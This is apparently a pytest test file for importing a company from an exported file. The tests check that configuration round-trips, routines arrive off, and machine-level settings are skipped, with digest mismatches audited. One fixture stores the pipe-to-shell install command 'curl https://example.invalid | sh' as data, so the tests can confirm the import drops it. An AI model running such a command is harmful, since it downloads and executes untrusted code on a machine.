"""A new company from an exported file (``services/management/company_import.py``):
the round trip keeps the configuration, a file never sets what runs on the
machine or an Owner's audited settings, routines arrive off, and the
backend's own digest is recorded beside the file's claim."""

import copy

import pytest
import test_agent_access
from models import Agent, Company, CompanyMember, Routine
from models.audit import AuditLog
from services.management import company_export, company_import
from sqlmodel import select

company = test_agent_access.company
enforcement = test_agent_access.enforcement

DAILY = {"every": "day", "at": "09:00", "timezone": "UTC"}


@pytest.fixture(autouse=True)
def audit_file(monkeypatch, tmp_path):
    monkeypatch.setenv("AUDIT_LOG_PATH", str(tmp_path / "audit"))


@pytest.fixture
def exported(sqlite_session, company):
    stored = sqlite_session.get(Company, company["id"])
    stored.limits = {"max_reworks": 2}
    stored.autonomy_level = 3
    stored.forge_policy = "publish"
    stored.stack_profile = {"install": "curl https://example.invalid | sh"}
    stored.research_hosts = ["example.invalid"]
    agent = sqlite_session.get(Agent, company["agent"])
    agent.system_prompt = "Write tests first."
    agent.model = "conn:999:some-model"
    sqlite_session.add_all(
        [
            stored,
            agent,
            Routine(
                company_id=company["id"],
                title="Audit",
                description="Audit {{scope}}",
                assignee="Developer",
                schedule=DAILY,
                variables=[
                    {
                        "name": "scope",
                        "label": None,
                        "default": "api",
                        "required": False,
                        "options": [],
                    }
                ],
            ),
        ]
    )
    sqlite_session.commit()
    return company_export.export(sqlite_session, company["id"], None)


def _import(test_client, headers, file, **extra):
    return test_client.post(
        "/v1/companies/import", json={"file": file, **extra}, headers=headers
    )


def test_the_round_trip_keeps_the_configuration(
    test_client, sqlite_session, company, exported
):
    made = _import(test_client, company["outsider"], exported, company_name="Acme copy")

    assert made.status_code == 201, made.text
    body = made.json()
    new = sqlite_session.get(Company, body["company_id"])
    assert new.company_name == "Acme copy" and new.limits == {"max_reworks": 2}
    [agent] = sqlite_session.exec(select(Agent).where(Agent.company_id == new.id)).all()
    assert (agent.role, agent.system_prompt) == ("Developer", "Write tests first.")
    [routine] = sqlite_session.exec(
        select(Routine).where(Routine.company_id == new.id)
    ).all()
    assert routine.variables[0]["name"] == "scope"
    assert routine.enabled is False and routine.next_run_at is None
    assert body["created"] == {"agents": 1, "business_units": 0, "routines": 1}
    assert body["digest_matches"] is True
    owner = sqlite_session.exec(
        select(CompanyMember).where(CompanyMember.company_id == new.id)
    ).one()
    assert owner.human_role == "Owner"


def test_a_file_never_sets_what_runs_on_the_machine(
    test_client, sqlite_session, company, exported
):
    body = _import(test_client, company["outsider"], exported).json()

    new = sqlite_session.get(Company, body["company_id"])
    assert new.stack_profile is None and new.research_hosts is None
    assert new.forge_policy == "none" and new.autonomy_level == 2
    skipped = {s["what"] for s in body["skipped"]}
    assert {
        "company.stack_profile",
        "company.research_hosts",
        "company.forge_policy",
        "company.autonomy_level",
        "agents[0].model",
    } <= skipped
    [agent] = sqlite_session.exec(select(Agent).where(Agent.company_id == new.id)).all()
    assert agent.model == ""  # the old company's connection does not carry over


def test_an_edited_file_imports_and_the_audit_says_so(
    test_client, sqlite_session, company, exported
):
    edited = copy.deepcopy(exported)
    edited["content"]["agents"][0]["persona"] = "Changed by hand"

    body = _import(test_client, company["outsider"], edited).json()

    assert body["digest_matches"] is False
    row = sqlite_session.exec(
        select(AuditLog).where(
            AuditLog.company_id == body["company_id"],
            AuditLog.action == company_import.AUDIT_ACTION,
        )
    ).one()
    assert row.result["sha256"] == company_export.digest(edited["content"])
    assert row.result["claimed_sha256"] == exported["manifest"]["sha256"]
    assert row.result["digest_matches"] is False and row.chain_hash


@pytest.mark.parametrize(
    "file",
    [
        {},
        {"manifest": {"format": "something-else/1"}, "content": {"company": {}}},
        {
            "manifest": {"format": company_export.FORMAT},
            "content": {"company": {"company_name": ""}},
        },
        {
            "manifest": {"format": company_export.FORMAT},
            "content": {"company": {"company_name": "X"}, "agents": "all"},
        },
    ],
)
def test_a_file_that_is_not_an_export_is_refused(test_client, company, file):
    assert _import(test_client, company["outsider"], file).status_code == 422


def test_an_anonymous_caller_imports_nothing(test_client, exported):
    assert _import(test_client, {}, exported).status_code == 401


def test_a_routine_for_a_role_the_file_does_not_hire_is_left_out(
    sqlite_session, exported
):
    file = copy.deepcopy(exported)
    file["content"]["routines"][0]["assignee"] = "Astronaut"

    body = company_import.import_company(sqlite_session, file, None, None)

    assert body["created"]["routines"] == 0
    assert any(s["what"] == "routines[0]" for s in body["skipped"])
